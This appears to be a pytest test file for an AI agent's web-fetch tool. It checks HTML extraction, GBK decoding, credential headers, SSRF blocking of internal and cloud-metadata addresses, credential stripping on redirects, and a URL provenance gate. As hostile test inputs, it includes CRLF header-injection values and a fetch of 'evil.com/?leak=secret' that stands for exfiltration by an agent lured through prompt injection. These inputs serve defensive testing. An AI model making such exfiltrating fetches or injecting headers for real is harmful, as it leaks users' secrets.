"""Tests for bowhead_core.web_fetch.

覆盖 schema/register、stdlib 抽取器(含**未闭合标签不丢内容** review P1)、GBK 解码(review P2)、
SSRF 挡内网、Tier-1 凭据拼头 + CRLF 剥离(review P2)、跨 origin 剥凭据 / 同 origin 留凭据、
重定向耗尽、content-type 白名单、截断、artifact 持久化 + 凭据不进 artifact、空正文回退 title。
"""

from __future__ import annotations

from types import SimpleNamespace
from typing import Any

import pytest
from bowhead_core.web_fetch import (
    _auth_headers,
    _extract,
    _handler,
    register_web_fetch_tool,
)


# ── stdlib extractor ─────────────────────────────────────────────────────────
def test_extract_drops_script_style_keeps_text() -> None:
    html = (
        "<html><head><title>Hello Title</title>"
        "<style>.x{color:red}</style></head>"
        "<body><script>var a=1;alert(2)</script>"
        "<h1>Heading</h1><p>First para.</p><p>Second para.</p></body></html>"
    )
    title, content = _extract(html)
    assert title == "Hello Title"
    assert "First para." in content and "Second para." in content and "Heading" in content
    # script/style code must be removed.
    assert "alert" not in content and "color:red" not in content


def test_extract_unclosed_structural_tag_keeps_content() -> None:
    """review P1: 未闭合 <header>/<form>/<button> 不能吞掉整页正文。"""
    for bad in (
        "<header>SITE HEADER<body><h1>T</h1><p>REAL ARTICLE BODY</p>",
        "<article><p>Intro.</p><button>X<p>REAL ARTICLE BODY</p></article>",
        "<body><form>Search<p>REAL ARTICLE BODY</p></form>",
    ):
        _title, content = _extract(bad)
        assert "REAL ARTICLE BODY" in content, f"lost content for: {bad!r}"


def test_extract_unclosed_title_keeps_content() -> None:
    """review P1: 未闭合 <title> 不能把全文吞进 title / 清空正文。"""
    _title, content = _extract("<head><title>NoClose<body><p>REAL BODY TEXT</p>")
    assert "REAL BODY TEXT" in content


def test_extract_title_strips_inner_markup() -> None:
    """review P3: title 里的 tag 不带进 markdown header。"""
    title, _content = _extract("<title>A<b>B</b>C &amp; D</title><body><p>x</p></body>")
    assert title == "ABC & D"


# ── Encoding: GBK Chinese pages (review P2) ───────────────────────────────────
@pytest.mark.asyncio
async def test_handler_gbk_via_header(monkeypatch: pytest.MonkeyPatch) -> None:
    body = "<html><body><p>中文页面</p></body></html>".encode("gbk")
    client = _FakeClient([(200, {"content-type": "text/html; charset=gbk"}, body)])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com"}, SimpleNamespace())  # type: ignore[arg-type]
    assert "中文页面" in r["content"]


@pytest.mark.asyncio
async def test_handler_gbk_via_meta_sniff(monkeypatch: pytest.MonkeyPatch) -> None:
    body = ('<html><head><meta charset="gbk"></head><body><p>中文内容</p></body></html>').encode("gbk")
    client = _FakeClient([(200, {"content-type": "text/html"}, body)])  # No charset in header
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com"}, SimpleNamespace())  # type: ignore[arg-type]
    assert "中文内容" in r["content"]


# ── Tier-1 credential headers + CRLF stripping ───────────────────────────────
def test_auth_headers_basic_bearer_cookie() -> None:
    import base64

    b = _auth_headers({"type": "basic", "username": "u", "password": "p"})
    assert b["Authorization"] == "Basic " + base64.b64encode(b"u:p").decode()
    assert _auth_headers({"type": "bearer", "token": "tk"})["Authorization"] == "Bearer tk"
    assert _auth_headers({"type": "cookie", "cookie": "sid=abc"})["Cookie"] == "sid=abc"
    assert _auth_headers({"type": "basic"}) == {}
    assert _auth_headers(None) == {}
    assert _auth_headers({"type": "weird"}) == {}


def test_auth_headers_strip_crlf_injection() -> None:
    """review P2: 凭据值里的 CR/LF 必须去掉, 防 header 注入。"""
    h = _auth_headers({"type": "bearer", "token": "tok\r\nX-Evil: 1"})
    val = h["Authorization"]
    assert "\r" not in val and "\n" not in val
    h2 = _auth_headers({"type": "cookie", "cookie": "a=b\r\nSet-Cookie: evil=1"})
    assert "\r" not in h2["Cookie"] and "\n" not in h2["Cookie"]


# ── handler: input validation + SSRF ─────────────────────────────────────────
@pytest.mark.asyncio
async def test_handler_empty_url() -> None:
    r = await _handler({}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["error"] == "url required"


@pytest.mark.asyncio
async def test_handler_non_http_scheme() -> None:
    r = await _handler({"url": "ftp://x/y"}, SimpleNamespace())  # type: ignore[arg-type]
    assert "UnsupportedProtocol" in r["error"]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "url",
    [
        "https://127.0.0.1/admin",
        "https://10.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "https://[::1]/",
    ],
)
async def test_handler_saas_blocks_internal(url: str, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("BOWHEAD_DEPLOYMENT_MODE", "saas")
    r = await _handler({"url": url}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["error"] == "url is not allowed for this deployment"


# ── streaming fake client ────────────────────────────────────────────────────
class _FakeStream:
    def __init__(self, status_code: int, headers: dict[str, str], body: bytes) -> None:
        self.status_code = status_code
        self.headers = headers
        self._body = body

    async def __aenter__(self) -> _FakeStream:
        return self

    async def __aexit__(self, *a: Any) -> None:
        return None

    async def aiter_bytes(self) -> Any:
        yield self._body


class _FakeClient:
    """记录每次 stream 的 (url, headers); 按 call 顺序吐 scripted response(越界 clamp 末条)."""

    def __init__(self, script: list[tuple[int, dict[str, str], bytes]]) -> None:
        self._script = script
        self.calls: list[tuple[str, dict[str, str]]] = []

    async def __aenter__(self) -> _FakeClient:
        return self

    async def __aexit__(self, *a: Any) -> None:
        return None

    def stream(self, method: str, url: str, headers: dict[str, str] | None = None) -> _FakeStream:
        self.calls.append((url, dict(headers or {})))
        i = min(len(self.calls) - 1, len(self._script) - 1)
        st, hd, body = self._script[i]
        return _FakeStream(st, hd, body)


def _patch_fetch_path(monkeypatch: pytest.MonkeyPatch, client: _FakeClient) -> None:
    """绕过真 DNS/SSRF（已单独测）+ 注入 fake client。"""
    monkeypatch.setattr("bowhead_core.web_fetch.validate_url", lambda *a, **k: None)
    monkeypatch.setattr("bowhead_core.web_fetch.build_guarded_async_client", lambda **k: client)


@pytest.mark.asyncio
async def test_handler_happy_path_preserves_local_http_url(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("BOWHEAD_DEPLOYMENT_MODE", "local")
    client = _FakeClient(
        [
            (200, {"content-type": "text/html; charset=utf-8"}, b"<html><title>T</title><body><p>hello world</p></body></html>"),
        ]
    )
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "http://example.com/a"}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["title"] == "T"
    assert "hello world" in r["content"] and "retrieved_at" in r
    assert client.calls[0][0] == "http://example.com/a"


@pytest.mark.asyncio
async def test_handler_raw_json(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient([(200, {"content-type": "application/json"}, b'{"a": 1}')])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com/j"}, SimpleNamespace())  # type: ignore[arg-type]
    assert '{"a": 1}' in r["content"]


@pytest.mark.asyncio
async def test_handler_cross_origin_redirect_strips_credentials(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    client = _FakeClient(
        [
            (302, {"location": "https://evil.com/phish"}, b""),
            (200, {"content-type": "text/html"}, b"<html><body><p>landed</p></body></html>"),
        ]
    )
    _patch_fetch_path(monkeypatch, client)
    r = await _handler(
        {"url": "https://origin.com/p", "auth": {"type": "basic", "username": "u", "password": "SECRETPW"}},
        SimpleNamespace(),  # type: ignore[arg-type]
    )
    assert "Authorization" in client.calls[0][1]  # Original origin receives credentials
    assert "Authorization" not in client.calls[1][1]  # evil.com does not
    assert "SECRETPW" not in str(r) and "landed" in r["content"]


@pytest.mark.asyncio
async def test_handler_same_origin_redirect_keeps_credentials(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """正向用例: 同 origin 重定向必须保留凭据(否则 same-host auth 会断)。"""
    client = _FakeClient(
        [
            (302, {"location": "https://origin.com/p2"}, b""),
            (200, {"content-type": "text/html"}, b"<html><body><p>ok</p></body></html>"),
        ]
    )
    _patch_fetch_path(monkeypatch, client)
    await _handler(
        {"url": "https://origin.com/p1", "auth": {"type": "bearer", "token": "TKN"}},
        SimpleNamespace(),  # type: ignore[arg-type]
    )
    assert "Authorization" in client.calls[0][1]
    assert "Authorization" in client.calls[1][1]  # Same origin → retain


@pytest.mark.asyncio
async def test_handler_redirect_exhaustion(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient([(302, {"location": "https://origin.com/loop"}, b"")])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://origin.com/start"}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["error"] == "blocked: too many redirects"


@pytest.mark.asyncio
async def test_handler_unsupported_content_type(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient([(200, {"content-type": "application/pdf"}, b"%PDF-1.7")])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com/f.pdf"}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["error"].startswith("unsupported_content_type")


@pytest.mark.asyncio
async def test_handler_truncates_to_max_chars(monkeypatch: pytest.MonkeyPatch) -> None:
    body = ("<html><body><p>" + ("x" * 5000) + "</p></body></html>").encode()
    client = _FakeClient([(200, {"content-type": "text/html"}, body)])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com", "max_chars": 1000}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["truncated"] is True and "[truncated]" in r["content"]
    assert len(r["content"]) < 1100


@pytest.mark.asyncio
async def test_handler_empty_content_falls_back_to_title(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient(
        [
            (200, {"content-type": "text/html"}, b"<html><head><title>OnlyTitle</title></head><body></body></html>"),
        ]
    )
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com"}, SimpleNamespace())  # type: ignore[arg-type]
    assert r.get("content") == "OnlyTitle"


@pytest.mark.asyncio
async def test_handler_http_error(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient([(404, {"content-type": "text/html"}, b"nope")])
    _patch_fetch_path(monkeypatch, client)
    r = await _handler({"url": "https://x.com/missing"}, SimpleNamespace())  # type: ignore[arg-type]
    assert r["error"] == "http 404"


# ── Artifact persistence + credentials excluded from artifacts ───────────────
class _FakeArt:
    id = "art_test123"


class _FakeStore:
    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []

    async def put_bytes(self, **kw: Any) -> _FakeArt:
        self.calls.append(kw)
        return _FakeArt()


@pytest.mark.asyncio
async def test_handler_persists_web_clip_without_creds(monkeypatch: pytest.MonkeyPatch) -> None:
    store = _FakeStore()
    ctx = SimpleNamespace(artifact_store=store, user_id="u", session_id="s", turn_id="t")
    client = _FakeClient(
        [
            (200, {"content-type": "text/html"}, b"<html><title>P</title><body><p>page body</p></body></html>"),
        ]
    )
    _patch_fetch_path(monkeypatch, client)
    r = await _handler(
        {"url": "https://x.com", "auth": {"type": "bearer", "token": "SUPERSECRET"}},
        ctx,  # type: ignore[arg-type]
    )
    assert r["artifact_id"] == "art_test123"
    assert len(store.calls) == 1
    kw = store.calls[0]
    assert kw["kind"] == "web_clip" and kw["inject"] == "stub" and kw["trust"] == "unverified"
    assert kw["producer_kind"] == "web_fetch"
    # Credentials must never enter artifact body.
    assert b"SUPERSECRET" not in kw["content"]


# ── URL provenance gate (prevent exfiltration) ───────────────────────────────
@pytest.mark.asyncio
async def test_handler_provenance_blocks_unseen_host(monkeypatch: pytest.MonkeyPatch) -> None:
    """ctx 有 seen set 但目标 host 不在 → 拒(模拟被注入页诱导 fetch evil.com)。"""
    client = _FakeClient([(200, {"content-type": "text/html"}, b"<p>should not reach</p>")])
    _patch_fetch_path(monkeypatch, client)
    ctx = SimpleNamespace(_seen_url_hosts={"example.com"})  # Only example.com has been seen
    r = await _handler({"url": "https://evil.com/?leak=secret"}, ctx)  # type: ignore[arg-type]
    assert "not in conversation context" in r["error"]
    assert client.calls == []  # No request sent at all


@pytest.mark.asyncio
async def test_handler_provenance_allows_seen_host(monkeypatch: pytest.MonkeyPatch) -> None:
    client = _FakeClient([(200, {"content-type": "text/html"}, b"<html><body><p>ok</p></body></html>")])
    _patch_fetch_path(monkeypatch, client)
    ctx = SimpleNamespace(_seen_url_hosts={"example.com"})
    r = await _handler({"url": "https://example.com/deep?q=1"}, ctx)  # type: ignore[arg-type]
    assert "ok" in r["content"]  # Same host → allow


@pytest.mark.asyncio
async def test_handler_provenance_flag_off(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("BOWHEAD_WEB_FETCH_PROVENANCE", "0")
    client = _FakeClient([(200, {"content-type": "text/html"}, b"<html><body><p>ok</p></body></html>")])
    _patch_fetch_path(monkeypatch, client)
    ctx = SimpleNamespace(_seen_url_hosts={"example.com"})
    r = await _handler({"url": "https://evil.com/x"}, ctx)  # type: ignore[arg-type]
    assert "ok" in r["content"]  # Flag off → no gate


# ── register ─────────────────────────────────────────────────────────────────
def test_register_default_on() -> None:
    from bowhead_core.tool_registry import ToolRegistry

    reg = ToolRegistry()
    assert register_web_fetch_tool(reg) is True
    assert reg.has("web_fetch")


def test_register_disabled_via_flag(monkeypatch: pytest.MonkeyPatch) -> None:
    from bowhead_core.tool_registry import ToolRegistry

    monkeypatch.setenv("BOWHEAD_WEB_FETCH", "0")
    reg = ToolRegistry()
    assert register_web_fetch_tool(reg) is False
    assert not reg.has("web_fetch")
